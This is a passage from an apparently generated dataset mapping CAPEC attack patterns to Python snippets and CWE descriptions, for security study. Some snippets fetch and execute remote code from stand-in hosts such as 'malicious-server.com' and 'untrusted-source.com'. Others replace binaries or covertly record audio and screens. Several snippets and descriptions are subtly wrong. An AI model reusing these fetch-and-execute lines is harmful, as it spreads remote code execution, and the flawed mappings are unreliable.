        "code_snippet": "import os\nimport ctypes\n\n# Simulate a vulnerable application loading a DLL\n# This is a simplified example and does not represent actual DLL loading\n\n# Path to the legitimate DLL\nlegit_dll_path = 'C:\\Program Files\\MyApp\\legit.dll'\n\n# Path to the malicious DLL placed in the WinSxS directory\nmalicious_dll_path = 'C:\\Windows\\WinSxS\\malicious.dll'\n\n# Function to load a DLL (vulnerable to side-loading)\ndef load_dll(dll_path):\n    try:\n        ctypes.CDLL(dll_path)\n        print(f'Successfully loaded {dll_path}')\n    except Exception as e:\n        print(f'Failed to load {dll_path}: {e}')\n\n# Vulnerable code: Incorrectly resolves the DLL path\n# This should load the legitimate DLL, but due to side-loading, it loads the malicious DLL\nload_dll('legit.dll')",
        "description": "This Python code snippet demonstrates a simplified example of DLL side-loading vulnerability. The `load_dll` function attempts to load a DLL by its name. Due to the lack of explicit path specification and reliance on the search path, the operating system may load a malicious DLL placed in the WinSxS directory instead of the legitimate one. This represents the CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path) weaknesses, where the search path can be manipulated by an attacker to load unauthorized resources."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import os\nimport shutil\n\n# Path to the binary that will be replaced\nbinary_path = '/usr/local/bin/target_binary'\n\n# Path to the malicious binary\nmalicious_binary_path = '/tmp/malicious_binary'\n\n# Check if the binary exists and has weak permissions\nif os.path.exists(binary_path) and os.access(binary_path, os.W_OK):\n    # Replace the binary with the malicious one\n    shutil.copy(malicious_binary_path, binary_path)\n    print(f'Replaced {binary_path} with malicious binary.')\nelse:\n    print(f'Cannot replace {binary_path}. Either it does not exist or lacks write permissions.')",
        "description": "This Python code snippet demonstrates a potential 'Replace Binaries' attack. It checks if a target binary exists and has weak file permissions (i.e., it is writable). If these conditions are met, it replaces the target binary with a malicious binary. This embodies the CAPEC concept of replacing binaries with malware due to incorrect permission assignments (CWE-732). The code also touches on the idea of untrusted search paths (CWE-426) and embedded malicious code (CWE-506) by assuming the malicious binary is placed in a location that the attacker controls."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import os\n\n# CWE-552: Files or Directories Accessible to External Parties\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-427: Uncontrolled Search Path Element\n# CWE-40: Path Traversal: '\\\\UNC\\share\\name\\' (Windows UNC Share)\n\ndef list_shared_directories(base_path):\n    try:\n        # CWE-40: Potentially dangerous path traversal\n        if not os.path.isabs(base_path):\n            raise ValueError(\"Base path must be an absolute path\")\n\n        # CWE-427: Uncontrolled search path element\n        for root, dirs, files in os.walk(base_path):\n            for dir_name in dirs:\n                dir_path = os.path.join(root, dir_name)\n                # CWE-552: Making directories accessible to external parties\n                if os.access(dir_path, os.R_OK):\n                    print(f\"Accessible directory: {dir_path}\")\n                    # CWE-200: Potential exposure of sensitive information\n                    with open(os.path.join(dir_path, 'sensitive_info.txt'), 'r') as f:\n                        print(f.read())\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nlist_shared_directories('C:\\\\shared')",
        "description": "This Python code snippet demonstrates the identification of shared directories on a system, which can be exploited by an adversary to locate and collect sensitive information or map potential routes for lateral movement within a network. The function `list_shared_directories` takes a base path and recursively lists directories that are accessible. It checks for absolute paths to prevent path traversal (CWE-40) and iterates through directories to identify those that are readable (CWE-552). If a directory is accessible, it attempts to read a file named 'sensitive_info.txt' to simulate the exposure of sensitive information (CWE-200). The code also highlights the risk of uncontrolled search paths (CWE-427) and unsafe actions due to privileges (CWE-267)."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import hashlib\nimport os\n\n# Simulate storing password hashes insecurely\nstored_hashes = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99',  # hash for 'password'\n}\n\n# Function to authenticate using password hash\ndef authenticate(username, password_hash):\n    if username in stored_hashes and stored_hashes[username] == password_hash:\n        return True\n    return False\n\n# Simulate an attacker capturing a hash\ncaptured_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\n\n# Attacker replays the captured hash\nif authenticate('user1', captured_hash):\n    print('Authentication successful')\nelse:\n    print('Authentication failed')",
        "description": "This Python code snippet demonstrates a vulnerable authentication mechanism that uses password hashes instead of passwords. The stored_hashes dictionary simulates a database of user password hashes. The authenticate function checks if the provided username and password hash match the stored values. An attacker captures a legitimate password hash and replays it to gain unauthorized access. This code embodies the 'Use of Captured Hashes (Pass The Hash)' attack described in the CAPEC, highlighting the CWE weaknesses such as 'Insufficiently Protected Credentials' (CWE-522), 'Use of Password Hash Instead of Password for Authentication' (CWE-836), and 'Authentication Bypass by Capture-replay' (CWE-294)."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import socket\nimport ssl\n\n# Simulate a Kerberos ticket capture\ncaptured_ticket = b'captured_ticket_data'\n\n# Create a socket connection to the target service\ncontext = ssl.create_default_context()\nwith socket.create_connection(('target_service', 443)) as sock:\n    with context.wrap_socket(sock, server_hostname='target_service') as ssock:\n        # Send the captured ticket to the target service\n        ssock.sendall(captured_ticket)\n        # Receive the response from the service\n        response = ssock.recv(4096)\n        print(response.decode('utf-8'))",
        "description": "This Python code snippet demonstrates a simplified version of a 'Pass The Ticket' attack, where an adversary uses a captured Kerberos ticket to authenticate to a target service. The code creates a secure socket connection to the target service and sends the captured ticket data to it. This embodies the main idea of CAPEC-639, where an adversary leverages stolen Kerberos tickets to gain unauthorized access. The code also touches on related CWEs such as CWE-522 (Insufficiently Protected Credentials) by assuming the ticket was captured due to insecure storage or transmission, and CWE-294 (Authentication Bypass by Capture-replay) by replaying the captured ticket to bypass authentication."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import os\nimport winreg\n\n# Function to get list of USB devices from Windows Registry\ndef get_usb_devices():\n    usb_devices = []\n    try:\n        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)\n        key = winreg.OpenKey(reg, r'SYSTEM\\CurrentControlSet\\Enum\\USBSTOR')\n        for i in range(0, winreg.QueryInfoKey(key)[0]):\n            device = winreg.EnumKey(key, i)\n            usb_devices.append(device)\n    except Exception as e:\n        print(f\"Error accessing registry: {e}\")\n    return usb_devices\n\n# Function to check for iOS backups\ndef check_ios_backups():\n    ios_backup_path = os.path.expanduser('~\\AppData\\Roaming\\Apple Computer\\MobileSync\\Backup')\n    if os.path.exists(ios_backup_path):\n        return os.listdir(ios_backup_path)\n    return []\n\n# Main function to gather peripheral information\nif __name__ == '__main__':\n    usb_devices = get_usb_devices()\n    ios_backups = check_ios_backups()\n    print(f\"USB Devices: {usb_devices}\")\n    print(f\"iOS Backups: {ios_backups}\")",
        "description": "This Python code snippet demonstrates how an adversary might gather information about peripheral devices connected to a Windows system, embodying the concept of 'Peripheral Footprinting' (CAPEC). The code includes two main functions: `get_usb_devices` and `check_ios_backups`. The `get_usb_devices` function accesses the Windows Registry to list USB devices that have been connected to the system, which relates to CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The `check_ios_backups` function checks for the presence of iOS backups in a typical directory, which could expose sensitive information (CWE-200). The gathered information is then printed, potentially aiding an adversary in further attacks."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import winreg\n\ndef collect_registry_data():\n    try:\n        registry_path = r'SOFTWARE\\ExampleSoftware\\SensitiveInfo'\n        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path, 0, winreg.KEY_READ)\n        value, regtype = winreg.QueryValueEx(registry_key, 'SensitiveData')\n        winreg.CloseKey(registry_key)\n        return value\n    except Exception as e:\n        print(f'Error accessing registry: {e}')\n\nif __name__ == '__main__':\n    sensitive_data = collect_registry_data()\n    if sensitive_data:\n        print(f'Collected Sensitive Data: {sensitive_data}')",
        "description": "This Python code snippet demonstrates how an adversary might exploit improper authorization and cleartext storage in the Windows Registry to collect sensitive information. The function `collect_registry_data` attempts to read a specific registry key that contains sensitive data. If successful, it returns the value of the sensitive data. This code embodies the CAPEC idea of collecting data from registries by exploiting weaknesses such as improper authorization (CWE-285) and cleartext storage in the registry (CWE-314). The code does not include proper authorization checks, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import pyautogui\nimport time\nimport os\n\n# Function to capture screenshots\ndef capture_screenshots(interval, duration, save_path):\n    end_time = time.time() + duration\n    while time.time() < end_time:\n        screenshot = pyautogui.screenshot()\n        timestamp = int(time.time())\n        screenshot.save(os.path.join(save_path, f'screenshot_{timestamp}.png'))\n        time.sleep(interval)\n\n# Example usage\nif __name__ == '__main__':\n    save_path = './screenshots'\n    os.makedirs(save_path, exist_ok=True)\n    capture_screenshots(interval=5, duration=60, save_path=save_path)",
        "description": "This Python code snippet captures screenshots of the system's screen at regular intervals and saves them to a specified directory. The 'capture_screenshots' function takes three parameters: 'interval' (time between screenshots), 'duration' (total time to capture screenshots), and 'save_path' (directory to save the screenshots). The code uses the 'pyautogui' library to capture the screen and the 'os' library to handle file paths. This code embodies the CAPEC 'Collect Data from Screen Capture' by demonstrating how an adversary could exploit screen capture functionality to gather sensitive information over time. The related CWEs provide context on potential vulnerabilities, such as improper privilege management (CWE-267), exposure of sensitive information (CWE-497), and cleartext transmission (CWE-319), which could be leveraged in conjunction with screen capture to further an attack."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import os\n\n# Function to check file extension\ndef is_safe_file(file_path):\n    allowed_extensions = ['.txt', '.jpg', '.png']\n    file_extension = os.path.splitext(file_path)[1]\n    if file_extension in allowed_extensions:\n        return True\n    return False\n\n# Example usage\nfile_path = 'example.txt '\nif is_safe_file(file_path):\n    print('File is safe to process.')\nelse:\n    print('File is not safe to process.')",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Adding a Space to a File Extension'. The function `is_safe_file` checks if a file has an allowed extension by splitting the file path and comparing the extension against a list of allowed extensions. However, the code does not properly handle trailing spaces in the file extension, which can be exploited by an attacker. For example, a file named 'example.txt ' (with a trailing space) would bypass the check and be considered safe, even though it might not be. This represents CWE-46 (Path Equivalence: 'filename '), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), and other related weaknesses by demonstrating how improper validation of file paths and extensions can lead to security issues."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import os\nfrom flask import Flask, request, redirect, url_for\nfrom werkzeug.utils import secure_filename\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/upload'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        # Check if the post request has the file part\n        if 'file' not in request.files:\n            return 'No file part'\n        file = request.files['file']\n        # If the user does not select a file, the browser submits an empty file without a filename\n        if file.filename == '':\n            return 'No selected file'\n        # Save the file without proper validation\n        filename = secure_filename(file.filename)\n        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n        return 'File successfully uploaded'\n    return '''\n    <!doctype html>\n    <title>Upload new File</title>\n    <h1>Upload new File</h1>\n    <form method=post enctype=multipart/form-data>\n      <input type=file name=file>\n      <input type=submit value=Upload>\n    </form>\n    '''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable file upload functionality using the Flask web framework. The code allows users to upload files to the server without proper validation or authentication, embodying the main idea of CAPEC-152: 'Upload a Web Shell to a Web Server'. The related CWEs are represented as follows:\n\n1. CWE-287 (Improper Authentication): The code does not authenticate users before allowing file uploads.\n2. CWE-434 (Unrestricted Upload of File with Dangerous Type): The code does not restrict the types of files that can be uploaded, potentially allowing dangerous files like web shells.\n3. CWE-553 (Command Shell in Externally Accessible Directory): Uploaded files are saved in a directory that could be accessible and executable by the web server.\n4. CWE-602 (Client-Side Enforcement of Server-Side Security): The code relies on the client to provide the file, without server-side validation.\n\nThis code snippet is a simplified example to illustrate how insufficient security measures can lead to vulnerabilities in web applications."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import sounddevice as sd\nimport numpy as np\nimport scipy.io.wavfile as wav\n\n# Record audio for 10 seconds\nfs = 44100  # Sample rate\nseconds = 10  # Duration of recording\nprint('Recording...')\nmyrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)\nsd.wait()  # Wait until recording is finished\nprint('Recording finished')\n\n# Save the recording to a file\nwav.write('eavesdropped_audio.wav', fs, myrecording)\nprint('Audio saved to eavesdropped_audio.wav')",
        "description": "This Python code snippet demonstrates a basic form of eavesdropping by recording audio from the microphone and saving it to a file. The code uses the 'sounddevice' library to capture audio for a specified duration and then saves the recording as a WAV file. This embodies the CAPEC concept of eavesdropping by intercepting raw audio communication. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is demonstrated by recording potentially sensitive conversations without consent. CWE-319 (Cleartext Transmission of Sensitive Information) is indirectly represented as the recorded audio is stored in an unencrypted format. CWE-514 and CWE-515 (Covert Channels) are represented by the unauthorized recording and storage of audio data. CWE-1300 (Improper Protection of Physical Side Channels) is illustrated by the lack of protection against physical eavesdropping through audio recording."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import socket\nimport ssl\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Simulate a Kerberos authentication request\nserver_address = ('example.com', 88)\n\n# Create a socket and wrap it with SSL for secure communication\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nssl_sock = ssl.wrap_socket(sock)\n\ntry:\n    ssl_sock.connect(server_address)\n    \n    # CWE-522: Sending credentials in plaintext (insecure method)\n    kerberos_ticket = 'user_ticket'  # This should be securely obtained and stored\n    ssl_sock.sendall(kerberos_ticket.encode('utf-8'))\n    \n    # CWE-294: Vulnerable to capture-replay attacks\n    response = ssl_sock.recv(1024)\n    if response == b'OK':\n        print('Authenticated successfully')\n    else:\n        print('Authentication failed')\nfinally:\n    ssl_sock.close()",
        "description": "This Python code snippet demonstrates a simplified and vulnerable implementation of Kerberos authentication. The code connects to a Kerberos server using SSL for secure communication. However, it sends the Kerberos ticket in plaintext, which is an example of CWE-522 (Insufficiently Protected Credentials). The code also uses single-factor authentication (CWE-308) and is susceptible to capture-replay attacks (CWE-294) because it does not implement any mechanism to prevent replaying the same ticket. This snippet embodies the main idea of CAPEC-Use of Known Kerberos Credentials by showing how an adversary could exploit these weaknesses to gain authenticated access."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import os\nimport getpass\n\n# Hardcoded credentials (CWE-522)\nUSERNAME = 'admin'\nPASSWORD = 'password123'\n\n# Function to authenticate user\ndef authenticate(username, password):\n    # Single-factor authentication (CWE-308)\n    if username == USERNAME and password == PASSWORD:\n        print('Authentication successful!')\n        return True\n    else:\n        print('Authentication failed!')\n        return False\n\n# Main function\nif __name__ == '__main__':\n    # Get credentials from user\n    user = input('Enter username: ')\n    pwd = getpass.getpass('Enter password: ')\n    \n    # Attempt to authenticate\n    if authenticate(user, pwd):\n        # Simulate authorized action\n        print('Performing authorized actions...')\n    else:\n        print('Access denied.')",
        "description": "This Python code snippet demonstrates a simple authentication mechanism that embodies the main idea of CAPEC-Use of Known Operating System Credentials. The code uses hardcoded credentials (CWE-522) and single-factor authentication (CWE-308) to authenticate a user. The user is prompted to enter a username and password, which are then checked against the hardcoded values. If the credentials match, the user is authenticated and allowed to perform authorized actions. This example highlights the vulnerabilities associated with using known credentials and single-factor authentication, making it susceptible to unauthorized access if the credentials are guessed or obtained by an adversary."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import tkinter as tk\nfrom tkinter import simpledialog\n\n# CWE-798: Use of Hard-coded Credentials\nHARDCODED_PASSWORD = 'password123'\n\n# CWE-1021: Improper Restriction of Rendered UI Layers or Frames\nclass CredentialPrompt:\n    def __init__(self, root):\n        self.root = root\n        self.root.title('Secure Login')\n        self.label = tk.Label(root, text='Enter your credentials')\n        self.label.pack(pady=10)\n        self.username = simpledialog.askstring('Username', 'Enter your username:')\n        self.password = simpledialog.askstring('Password', 'Enter your password:', show='*')\n        self.check_credentials()\n\n    def check_credentials(self):\n        # CWE-522: Insufficiently Protected Credentials\n        if self.password == HARDCODED_PASSWORD:\n            print('Access Granted')\n        else:\n            print('Access Denied')\n\nif __name__ == '__main__':\n    root = tk.Tk()\n    app = CredentialPrompt(root)\n    root.mainloop()",
        "description": "This Python code snippet demonstrates a simple GUI application using Tkinter that impersonates a credential prompt to steal user credentials. The application asks the user for a username and password. The password is compared against a hard-coded password (CWE-798), which is a security flaw. The GUI does not properly restrict UI layers (CWE-1021), making it easy for an attacker to create a fake prompt. The credentials are insufficiently protected (CWE-522) as they are checked directly against a hard-coded value. This code represents the main idea of CAPEC- Credential Prompt Impersonation, where an adversary creates a fake prompt to steal user credentials."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-541: Inclusion of Sensitive Information in an Include File\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef add_data_to_file(file_path, data):\n    try:\n        with open(file_path, 'a') as f:\n            f.write(data)\n            print(f\"Data added to {file_path}\")\n    except Exception as e:\n        print(f\"Error adding data to file: {e}\")\n\n# Create a temporary file (CWE-377)\ntemp_file = tempfile.NamedTemporaryFile(delete=False)\n\n# Add sensitive information to the temporary file (CWE-541)\nsensitive_data = \"username=admin\\npassword=secret\"\nadd_data_to_file(temp_file.name, sensitive_data)\n\n# Add additional data to increase file size (CAPEC-156)\nlarge_data = \"A\" * 1000000  # 1MB of data\nadd_data_to_file(temp_file.name, large_data)\n\n# Log the file path (CWE-532)\nlog_file = \"application.log\"\nwith open(log_file, 'a') as log:\n    log.write(f\"Temporary file created at: {temp_file.name}\\n\")\n\n# Simulate file upload with dangerous type (CWE-434)\n# and reliance on file extension (CWE-646)\nuploaded_file = \"malicious_script.py\"\nos.rename(temp_file.name, uploaded_file)\nprint(f\"File uploaded as {uploaded_file}\")",
        "description": "This Python code snippet demonstrates the concept of 'Avoid Security Tool Identification by Adding Data' (CAPEC-156) by adding data to a file to increase its size and change its hash. The code also incorporates several related CWEs:\n\n1. CWE-377: An insecure temporary file is created using `tempfile.NamedTemporaryFile`.\n2. CWE-541: Sensitive information (username and password) is added to the temporary file.\n3. CAPEC-156: Additional data is appended to the file to increase its size.\n4. CWE-532: The path of the temporary file is logged, potentially exposing sensitive information.\n5. CWE-434 and CWE-646: The temporary file is renamed to a potentially dangerous file type (`.py`), simulating an unrestricted upload and reliance on file extension.\n\nThe code highlights how an attacker might manipulate file size and content to evade security tools, while also demonstrating various security weaknesses that could be exploited in the process."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import random\n\nclass VoicePhishingSimulator:\n    def __init__(self):\n        self.legitimate_numbers = ['800-123-4567', '800-987-6543']\n        self.sensitive_info = {'password': 'supersecret', 'ssn': '123-45-6789'}\n\n    def receive_call(self, caller_id):\n        if caller_id not in self.legitimate_numbers:\n            print('Warning: Unverified caller ID!')\n        else:\n            self.handle_call(caller_id)\n\n    def handle_call(self, caller_id):\n        print(f'Call from {caller_id} received.')\n        if random.choice([True, False]):\n            self.expose_sensitive_info()\n        else:\n            print('No sensitive information shared.')\n\n    def expose_sensitive_info(self):\n        print(f'Exposing sensitive information: {self.sensitive_info}')\n\n# Simulate a voice phishing attack\nsimulator = VoicePhishingSimulator()\ncaller_id = '800-555-1234'  # An unverified caller ID\nsimulator.receive_call(caller_id)",
        "description": "This Python code snippet simulates a voice phishing attack scenario. The `VoicePhishingSimulator` class contains a list of legitimate phone numbers and some sensitive information. The `receive_call` method checks if the caller ID is from a legitimate number. If not, it warns the user about the unverified caller ID. If the caller ID is legitimate, it proceeds to handle the call, where there is a random chance of exposing sensitive information. This code embodies the main idea of the CAPEC by demonstrating how an adversary might exploit improper verification of the source of a communication channel (CWE-940) and potentially expose private personal information (CWE-359)."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import requests\n\n# URL of the supposed legitimate update server\nlegit_update_url = 'http://legit-update-server.com/update'\n\n# URL of the malicious update server (spoofed)\nmalicious_update_url = 'http://malicious-server.com/update'\n\n# Function to download and execute update\ndef download_and_execute_update(update_url):\n    response = requests.get(update_url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download update')\n\n# Simulate a spoofing attack by redirecting to the malicious update server\nupdate_url = malicious_update_url\n\n# Download and execute the update from the spoofed URL\ndownload_and_execute_update(update_url)",
        "description": "This Python code snippet demonstrates a scenario where an attacker uses spoofing to trick a client into downloading and executing a malicious software update. The code initially sets a legitimate update URL but then redirects to a malicious update URL, simulating a spoofing attack. The `download_and_execute_update` function downloads the update from the specified URL and executes it without verifying the origin or integrity of the code, embodying CWE-494 (Download of Code Without Integrity Check). This can lead to the execution of embedded malicious code (CWE-506) and potentially replicating malicious code (CWE-509). The code snippet highlights the vulnerability described in the CAPEC by showing how an attacker can exploit the lack of proper verification to deliver a malicious update."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import ctypes\nimport os\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-494: Download of Code Without Integrity Check\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command\n\n# Simulate downloading a library from an untrusted source\nlibrary_url = 'http://untrusted-source.com/malicious_lib.so'\nos.system(f'wget {library_url} -O /tmp/malicious_lib.so')\n\n# Load the downloaded library\nmalicious_lib = ctypes.CDLL('/tmp/malicious_lib.so')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Simulate a function that checks for root/jailbreak\ndef is_device_rooted():\n    # This function would normally check for root/jailbreak status\n    return False\n\n# Hook the is_device_rooted function to always return False\noriginal_is_device_rooted = is_device_rooted\n\ndef hooked_is_device_rooted():\n    return False\n\nis_device_rooted = hooked_is_device_rooted\n\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\n# Simulate a custom URL scheme handler\ncustom_url_scheme = 'myapp://check_root'\n\n# Improperly handle the custom URL scheme\nif custom_url_scheme.startswith('myapp://'):\n    print('Handling custom URL scheme...')\n    if is_device_rooted():\n        print('Device is rooted!')\n    else:\n        print('Device is not rooted!')\n\n# The adversary can now bypass root/jailbreak detection\nprint('Root/Jailbreak detection evasion successful:', not is_device_rooted())",
        "description": "This Python code snippet demonstrates a scenario where an adversary evades root/jailbreak detection by hooking a function. The code simulates downloading a malicious library from an untrusted source (CWE-829, CWE-494) and loading it using ctypes. It then hooks the `is_device_rooted` function to always return False, bypassing the root/jailbreak check. Additionally, it shows improper handling of a custom URL scheme (CWE-939) and exposure of sensitive system information (CWE-497). The main idea is to illustrate how an adversary can manipulate code to evade security checks and gain unauthorized access."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import os\nimport sys\nimport ctypes\n\ndef is_debugger_present():\n    return ctypes.windll.kernel32.IsDebuggerPresent() != 0\n\ndef check_root_jailbreak():\n    # Check for common root/jailbreak indicators\n    root_indicators = ['/system/bin/su', '/system/xbin/su', '/system/app/Superuser.apk']\n    for indicator in root_indicators:\n        if os.path.exists(indicator):\n            return True\n    return False\n\ndef main():\n    if is_debugger_present():\n        print('Debugger detected! Exiting...')\n        sys.exit(1)\n    if check_root_jailbreak():\n        print('Root/Jailbreak detected! Exiting...')\n        sys.exit(1)\n    print('Application running normally.')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a basic implementation of root/jailbreak detection and debugger presence check, which are common security measures in mobile applications. The `is_debugger_present` function uses the Windows API to check if a debugger is attached to the process, while the `check_root_jailbreak` function looks for common indicators of a rooted or jailbroken device. If either condition is detected, the application exits. This code embodies the main idea of CAPEC-Root/Jailbreak Detection Evasion via Debugging by showing how an adversary might attempt to bypass these checks. The related CWEs are represented by the potential vulnerabilities in the detection mechanisms, such as active debug code (CWE-489) and exposure of sensitive system information (CWE-497)."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\nexec(response.text)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\nuser_input = input('Enter your username: ')\nif user_input == 'admin':\n    print('Access granted')\nelse:\n    print('Access denied')\n\n# CWE-300: Channel Accessible by Non-Endpoint\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('example.com', 80))\ns.sendall(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\ndata = s.recv(1024)\nprint('Received', repr(data))\ns.close()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Adversary in the Browser (AiTB)'. The code downloads and executes a script from a remote location without verifying its integrity (CWE-494), relies on client-side enforcement of security (CWE-602), and establishes a communication channel that could be accessed or influenced by an unauthorized actor (CWE-300). The code is vulnerable to manipulation by an adversary who can exploit these weaknesses to manipulate traffic and potentially gain unauthorized access or execute malicious code."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "import numpy as np\n\n# Simulate speculative execution vulnerability\nsecret_data = np.random.randint(0, 256, size=256)\n\n# Function that should not access secret data\ndef access_data(index):\n    if index < len(secret_data):\n        return secret_data[index]\n    else:\n        return 0\n\n# Speculative execution gadget\ndef speculative_execution(index):\n    try:\n        # Speculative execution may access secret data\n        dummy = secret_data[index]\n    except IndexError:\n        pass\n\n# Simulate branch prediction and speculative execution\nfor i in range(1000):\n    speculative_execution(i % 256)\n\n# Covert channel to leak data\ncache_timing = np.zeros(256)\nfor i in range(256):\n    start = time.time()\n    access_data(i)\n    end = time.time()\n    cache_timing[i] = end - start\n\n# Infer secret data based on cache timing\nleaked_data = np.argmin(cache_timing)\nprint(f'Leaked secret data: {leaked_data}')",
        "description": "This Python code snippet simulates a speculative execution attack, which is a type of transient instruction execution vulnerability. The code creates a scenario where speculative execution may access sensitive data (secret_data) that should not be accessed. The speculative_execution function attempts to access secret_data based on an index, potentially causing a side-channel effect. The covert channel is simulated by measuring the time it takes to access each element in secret_data, inferring the secret data based on cache timing differences. This represents the exploitation of transient execution to expose sensitive information, aligning with the CAPEC description and related CWEs."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import requests\n\n# Vulnerable function that takes a URL from user input and fetches data from it\ndef fetch_data_from_url(user_input_url):\n    try:\n        response = requests.get(user_input_url)\n        return response.text\n    except requests.RequestException as e:\n        return str(e)\n\n# Example usage\nuser_input_url = input('Enter the URL to fetch data from: ')\nprint(fetch_data_from_url(user_input_url))",
        "description": "This Python code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The function `fetch_data_from_url` takes a URL provided by the user and makes a request to that URL using the `requests` library. The response from the URL is then returned to the user. This code is vulnerable because it does not validate the user input, allowing an attacker to craft a malicious URL that could force the server to make requests to internal services or external third parties with the server's privileges. This can lead to unauthorized access to sensitive data or other malicious actions. The code embodies the main idea of CAPEC-918 (SSRF) and is related to CWE-20 (Improper Input Validation) and CWE-918 (Server-Side Request Forgery)."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "import os\nimport struct\n\n# CWE-1188: Initialization of a Resource with an Insecure Default\nDEFAULT_AUTH_KEY = b'0000'  # Insecure default key\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-353: Missing Support for Integrity Check\n# CWE-862: Missing Authorization\n# CWE-288: Authentication Bypass Using an Alternate Path or Channel\ndef manipulate_firmware(spi_device, firmware_data):\n    # Simulate SPI flash manipulation\n    with open(spi_device, 'wb') as spi_flash:\n        spi_flash.write(firmware_data)\n\n    # Bypass authentication by using insecure default key\n    if authenticate(DEFAULT_AUTH_KEY):\n        print(\"Authentication bypassed using default key.\")\n        # Modify memory or extract data\n        extract_data(spi_device)\n    else:\n        print(\"Authentication failed.\")\n\n\ndef authenticate(key):\n    # Simulate an insecure authentication check\n    return key == DEFAULT_AUTH_KEY\n\n\ndef extract_data(spi_device):\n    # Simulate data extraction from SPI flash\n    with open(spi_device, 'rb') as spi_flash:\n        data = spi_flash.read()\n        print(f\"Extracted data: {data}\")\n\n\n# Example usage\nfirmware_data = struct.pack('I', 0xDEADBEEF)  # Example firmware data\nmanipulate_firmware('/tmp/spi_flash.bin', firmware_data)",
